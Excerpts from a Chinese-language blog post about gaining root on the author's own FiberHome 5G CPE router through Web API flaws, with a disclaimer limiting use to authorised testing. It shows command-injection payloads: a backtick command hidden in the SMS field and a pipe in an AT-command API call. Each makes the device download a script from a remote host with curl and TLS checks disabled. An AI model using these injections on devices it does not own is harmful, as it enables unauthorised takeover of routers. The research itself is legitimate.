...
两年前买了一台烽火 5G CPE，使用了半年左右，就一直放着吃灰，最近翻出来，想看看能不能获取 root 权限、跑一些自定义服务。折腾了一段时间，在 Web API 里发现了不少安全问题，也成功实现了固件修改和 SSH 持久化。这篇文章把整个研究过程记录下来。
...
我这张电信卡限制下行 500 Mbps，上行 100 Mbps，实际测试最高能到 400 Mbps / 100 Mbps，晚高峰基站限速的情况下，下行大概可以跑到 200 - 300 Mbps。

![峰谷测速对比](https://static.codming.com/img/20260413174656288.png)

*以下分析均基于 RP0108 版本，不同版本 API 和漏洞可能有所不同，具体以实际测试为准。*

> 以下内容仅供教育目的和已授权的测试，请仅在您拥有所有权或已获得明确书面许可的网络和设备上使用。对于因使用本文内容或脚本而导致的任何滥用或损害，作者概不负责。
...
```shell
# 下载脚本到持久分区
curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh
...
这是最容易操作的方式，直接在设备的 Web 管理页面发短信就行，但缺点就是没有回显，需要以实际能否连接为准，如果命令错误或者版本更新后漏洞无法利用，那可以看后面的其他方式。
...
![短信发送注入](https://static.codming.com/img/20260413174656282.gif)
...
```
test`curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh`
...
```shell
POST /api/tmp/FHAPIS  ajaxmethod=set_at_command
{'command': 'AT|curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh'}
...
# 下载并执行脚本开启 SSH
adb shell "curl -sSLk -o /data/ssh_enable.sh static.codming.com/tmp/ssh_enable.sh"
